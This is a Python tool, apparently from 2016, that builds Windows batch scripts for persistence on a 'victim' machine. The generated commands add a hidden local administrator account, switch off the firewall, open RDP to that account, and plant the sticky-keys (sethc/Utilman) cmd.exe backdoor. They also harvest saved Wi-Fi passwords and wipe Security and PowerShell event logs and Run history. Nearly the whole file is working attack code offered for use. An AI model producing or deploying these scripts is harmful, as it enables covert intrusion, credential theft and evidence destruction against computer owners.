#Name:   QuickScript
#Author: Matt Waddell
#Info:   Customize and create scripts quickly for deployment on victim Windows machine.

import argparse

def bat_account_create(name, password, outputFile):
	#Example: bat_account_create('NET_USER32', 'Password123', outfile)
	with open(outputFile, 'a') as f:

		#Creates an account
		f.write('ECHO Creating SAM Account\n')
		f.write('NET USER ' + name + ' ' + password + ' /add /active:\"yes\" /expires:\"never\" > nul\n')
		f.write('ECHO.\n')

		#Add account to administrators group
		f.write('ECHO Adding SAM Account to Local Administrators\n')
		f.write('NET LOCALGROUP ADMINISTRATORS ' + name + ' /add > nul\n')
		f.write('ECHO.\n')

		#Hide account from the login screen
		f.write('ECHO Hiding SAM Account from Login Screen\n')
		f.write('REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v ' + name + ' /t REG_DWORD /d \"00000000\" /f > nul\n')
		f.write('ECHO.\n')

		#Hide the profile directory for the account
		#f.write('ECHO Hiding SAM Profile Directory\n')
		#f.write('ATTRIB C:\\users\\' + name + ' +r +a +s +h > nul\n')
		#f.write('ECHO.\n')

def bat_hotspot(ssid, password, outputFile):
	#Example: bat_hotspot("FreeWifi", "Pass1234", outfile)

	#Password requires being 8 characters
	#To disable, "Netsh wlan stop hostednetwork" & "Netsh wlan set hostednetwork mode=disallow"
	#Having issues connecting to the hotspot, must use certain password complexity, maybe other issues
	#like having to configure ICS
	print('NETSH WLAN SET HOSTEDNETWORK MODE=allow SSID="' + ssid + '" KEY="' + password + '" KEYUSAGE=persistent')
	print('NETSH WLAN START HOSTEDNETWORK')

def bat_eventlogs_cleared(outputFile):
	#Example: bat_eventlogs_cleared(outfile)
	with open(outputFile, 'a') as f:

		#Clear event logs from pc
		f.write('ECHO Clearing Event Logs\n')
		f.write('wevtutil.exe cl \"Microsoft-Windows-AppLocker/EXE and DLL\" > nul\n')
		f.write('wevtutil.exe cl \"Microsoft-Windows-PowerShell/Operational\" > nul\n')
		f.write('wevtutil.exe cl \"Security\" > nul\n')
		f.write('ECHO.\n')

def bat_firewall_disable(outputFile):
	#Example: bat_firewall_disable(outfile)
	with open(outputFile, 'a') as f:

		#Turn off Windows Firewall
		f.write('ECHO Disabling Windows Firewall\n')
		f.write('NETSH ADVFIREWALL SET ALLPROFILES STATE OFF > nul\n')
		f.write('ECHO.\n')

def bat_rdp_setup(name, outputFile):
	#Example: bat_rdp_setup('NET_USER32', outfile)
	with open(outputFile, 'a') as f:
	
		#Add account to RDP user list
		f.write('ECHO Adding SAM Account to Remote Desktop Users List\n')
		f.write('NET LOCALGROUP \"Remote Desktop Users\" '+ name + ' /add > nul\n') 						#WMIC GROUP WHERE \"SID = \'S-1-5-32-555\'\" GET NAME /Value | Find \"=\"
		f.write('ECHO.\n')

		#Configure terminal server settings for RDP
		f.write('ECHO Modifying RDP Settings in Registry\n')
		f.write('REG ADD \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f > nul\n')
		f.write('REG ADD \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f > nul\n')
		f.write('REG ADD \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v \"MaxConnectionTime\" /t REG_DWORD /d 0x1 /f > nul\n')
		f.write('REG ADD \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v \"MaxDisconnectionTime\" /t REG_DWORD /d 0x0 /f > nul\n')
		f.write('REG ADD \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v \"MaxIdleTime\" /t REG_DWORD /d 0x0 /f > nul\n')
		f.write('ECHO.\n')

def bat_runmru(outputFile):
	#Example: bat_runmru(outfile)
	with open(outputFile, 'a') as f:

		#Delete registry key containing run MRU
		f.write('ECHO Removing Run History\n')
		f.write('REG DELETE \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" /f > nul\n')
		f.write('ECHO.\n')

def bat_sticky_keys(outputFile):
	#Example bat_sticky_keys(outfile)
	with open(outputFile, 'a') as f:

		#Add registry hack for sticky keys
		f.write('ECHO Adding Sticky Keys to Windows Registry\n')
		f.write('REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" > nul\n')
		f.write('REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" > nul\n')
		f.write('ECHO.\n')

def bat_wifipass(outputFile):
	#Example bat_wifipass(outfile)
	with open(outputFile, 'a') as f:

		#Drop WifiPasswordReveal script into batch file (Thanks lallousx86)
		f.write('ECHO Grabbing all wifi passwords stored on %computername%\n')
		f.write("setlocal enabledelayedexpansion\n")
		f.write("ECHO Wireless Profile Passwords: >> %computername%.txt\n")
		f.write("ECHO. >> %computername%.txt\n")
		f.write(":main\n")
		f.write("    call :get-profiles r\n")
		f.write("    :main-next-profile\n")
		f.write('        for /f "tokens=1* delims=," %%a in ("%r%") do (\n')
		f.write('            call :get-profile-key "%%a" key\n')
		f.write('            if "!key!" NEQ "" (\n')
		f.write("                echo SSID: [%%a] Password: [!key!] >> %computername%.txt\n")
		f.write("            )\n")
		f.write("            set r=%%b\n")
		f.write("        )\n")
		f.write('        if "%r%" NEQ "" goto main-next-profile\n')
		f.write("    goto :fin\n")
		f.write(":get-profile-key <1=profile-name> <2=out-profile-key>\n")
		f.write("    setlocal\n")
		f.write("    set result=\n")
		f.write('    FOR /F "usebackq tokens=2 delims=:" %%a in (\n')
		f.write('        `netsh wlan show profile name^="%~1" key^=clear ^| findstr /C:"Key Content"`) DO (\n')
		f.write("        set result=%%a\n")
		f.write("        set result=!result:~1!\n")
		f.write("    )\n")
		f.write("    (\n")
		f.write("        endlocal\n")
		f.write("        set %2=%result%\n")
		f.write("    )\n")
		f.write("    goto :eof\n")
		f.write(":get-profiles <1=result-variable>\n")
		f.write("    setlocal\n")
		f.write("    set result=\n")
		f.write("   \n")
		f.write('    FOR /F "usebackq tokens=2 delims=:" %%a in (\n')
		f.write('        `netsh wlan show profiles ^| findstr /C:"All User Profile"`) DO (\n')
		f.write("        set val=%%a\n")
		f.write("        set val=!val:~1!\n")
		f.write("        set result=%!val!,!result!\n")
		f.write("    )\n")
		f.write("    (\n")
		f.write("        endlocal\n")
		f.write("        set %1=%result:~0,-1%\n")
		f.write("    )\n")
		f.write("    goto :eof\n")
		f.write(":fin\n")
		f.write('ECHO.\n')

def bat_ipconfig(outputFile):
	#Example bat_ipconfig(outfile)
	with open(outputFile, 'a') as f:

		#Grab ipconfig /all
		f.write('ECHO Grabbing Network Information\n')
		f.write('ipconfig /all >> %computername%.txt\n')
		f.write('ECHO.\n')

def main():
	recon = False

	parser = argparse.ArgumentParser(
			prog='QuickBat.py',
			usage='%(prog)s [-o OUTPUTFILE] [-sam ACCOUNT PASSWORD] [-hotspot SSID PASSWORD] [-fw] [-rdp ACCOUNT] [-cl] [-sticky] [-run]',
			description='Quick Batch helps quickly customize a BAT file for persistence on a victim machine.',
			epilog='Quick Batch (c) 2016'
	)

	parser.add_argument("-o", required=True, help="Output File to Contain Batch Commands")					#Working
	parser.add_argument("-sam", nargs=2, help="Create new SAM Account and Hide it from the login screen")	#Working
	parser.add_argument("-hotspot", nargs=2, help="Turn computer into hotspot with SSID and Password")		#Incomplete
	parser.add_argument("-fw", default=False, action="store_true", help="Disable Windows Firewall")			#Working
	parser.add_argument("-rdp", help="Configure RDP for SAM Account Name")									#Working
	parser.add_argument("-sticky", default=False, action="store_true", help="Enable Sticky Keys")			#Working
	parser.add_argument("-wifi", default=False, action="store_true", help="Grab all wifi passwords")		#Working
	parser.add_argument("-ipconfig", default=False, action="store_true", help="Grab ipconfig /all")			#Test
	parser.add_argument("-run", default=False, action="store_true", help="Clear Run History")				#Working
	parser.add_argument("-cl", default=False, action="store_true", help="Clear Event Logs")					#Working

	args = parser.parse_args()

	#Check for recon arguments
	if args.wifi: recon = True
	if args.ipconfig: recon = True

	#Pass arguments to respective functions
	if args.o:
		with open(args.o, 'w') as f:
			f.write('@ECHO OFF\nREM Created with Quick Batch\n\n')
			if recon: f.write("ECHO ================= Recon File ================= > %computername%.txt\nECHO. >> %computername%.txt\n")

	if args.sam: bat_account_create(args.sam[0], args.sam[1], args.o)
	if args.hotspot: bat_hotspot(args.hotspot[0], args.hotspot[1], args.o)
	if args.fw:	bat_firewall_disable(args.o)
	if args.rdp: bat_rdp_setup(args.rdp, args.o)
	if args.sticky: bat_sticky_keys(args.o)
	if args.wifi: bat_wifipass(args.o)
	if args.ipconfig: bat_ipconfig(args.o)
	if args.run: bat_runmru(args.o)
	if args.cl: bat_eventlogs_cleared(args.o)


main()
